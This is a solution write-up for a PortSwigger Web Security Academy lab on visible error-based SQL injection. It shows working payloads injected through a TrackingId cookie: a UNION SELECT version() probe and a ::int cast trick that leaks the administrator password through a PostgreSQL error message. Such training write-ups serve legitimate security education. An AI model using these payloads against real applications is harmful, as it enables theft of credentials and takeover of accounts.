# Visible error-based SQL injection

**Lab Url**: [https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

## Objective

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.

## Solution

The application uses a tracking cookie that is passed into a SQL query. Errors are returned in the response, allowing us to extract data via deliberate type-mismatch errors.

### Step 1: Confirm injection

Append an apostrophe to the `TrackingId` cookie value. The error message reveals the query structure:

```html
<h4>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'hDN0d90FBSgxzqUf''. Expected  char</h4>
```

The query is `SELECT * FROM tracking WHERE id = '...'`.

### Step 2: Determine the database type

Use a `UNION SELECT` with `version()` to confirm the database is PostgreSQL:

```text
TrackingId=YOUR-TRACKING-ID' UNION SELECT version()--
```

### Step 3: Leak the password via an error message

PostgreSQL's `CAST()` function raises an error when converting a string to an incompatible type like `int`. Wrap the password query in a `CAST` to force the error to display the value:

```text
TrackingId='; SELECT (SELECT password FROM users LIMIT 1)::int--
```

The `::int` shorthand casts the result to an integer, which fails and reveals the password in the error:

```html
<h4>ERROR: invalid input syntax for type integer: "f11cl614ckft5amkzyf3"</h4>
```

Log in as `administrator` with the retrieved password to solve the lab.
